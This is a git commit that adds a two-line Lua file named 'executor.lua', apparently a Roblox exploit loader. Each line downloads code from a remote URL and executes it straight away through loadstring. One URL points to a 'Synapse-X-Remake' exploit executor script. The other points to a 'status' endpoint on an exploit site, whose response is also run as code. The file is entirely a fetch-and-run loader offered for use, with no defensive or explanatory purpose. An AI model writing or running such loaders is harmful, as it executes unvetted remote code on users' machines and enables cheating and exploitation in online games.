839bb8e129782052588cfad342ecc42921796f45
anyahubs <131607266+anyahubs@users.noreply.github.com>
2023-05-25 16:24:21 +0300

    Add files via upload

---
+++ executor.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua'))()
+loadstring(game:HttpGet('https://api.whatexploitsare.online/status'))()
